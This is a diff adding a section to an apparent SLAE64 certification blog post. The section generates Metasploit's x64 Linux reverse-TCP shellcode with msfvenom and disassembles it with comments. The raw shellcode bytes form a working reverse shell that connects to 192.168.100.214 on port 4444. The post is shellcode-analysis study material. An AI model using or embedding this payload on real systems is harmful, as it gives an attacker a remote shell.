@@ -200,6 +200,70 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 
 Sadly enough, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a shell that binds to port 4444.
 
+#### linux/x64/shell_reverse_tcp (#3 Shellcode)
+
+###### Generating shellcode
+
+```term
+root@whitecr0wz:~# msfvenom -p linux/x64/shell_reverse_tcp -i 0 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of c file: 335 bytes
+unsigned char buf[] =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
+"\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10"
+"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
+"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
+root@whitecr0wz:~#
+```
+
+##### Ndisasm
+
+```term
+root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
+00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.   
+00000002  58                pop rax                           ; Pops this value into RAX.
+00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000004  6A02              push byte +0x2                    ; Pushes the value 2 into the stack.
+00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
+00000007  6A01              push byte +0x1                    ; Pushes the value 1 into the stack.
+00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
+0000000A  0F05              syscall                           ; Executes the syscall.
+0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
+0000000E  48B90200115CC0A8  mov rcx,0xd664a8c05c110002        ; Pushes "192.168.100.214:4444" within the hex format in reverse. Furthermore, as this string is not long enough to fulfill RCX, additional nulls are parsed.
+         -64D6
+00000018  51                push rcx                          ; RCX is pushed into the stack.
+00000019  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+0000001C  6A10              push byte +0x10                   ; Pushes the value 16 into the stack.
+0000001E  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
+0000001F  6A2A              push byte +0x2a                   ; Pushes syscall value 42 (value of the socket connect) into the stack.
+00000021  58                pop rax                           ; Pops this value into RAX.
+00000022  0F05              syscall                           ; Executes the syscall.
+00000024  6A03              push byte +0x3
+00000026  5E                pop rsi
+00000027  48FFCE            dec rsi
+0000002A  6A21              push byte +0x21
+0000002C  58                pop rax
+0000002D  0F05              syscall
+0000002F  75F6              jnz 0x27
+00000031  6A3B              push byte +0x3b
+00000033  58                pop rax
+00000034  99                cdq
+00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+         -6800
+0000003F  53                push rbx
+00000040  4889E7            mov rdi,rsp
+00000043  52                push rdx
+00000044  57                push rdi
+00000045  4889E6            mov rsi,rsp
+00000048  0F05              syscall
+```
+
+Once again, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards the local address in port 4444.
+
 ### Code
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
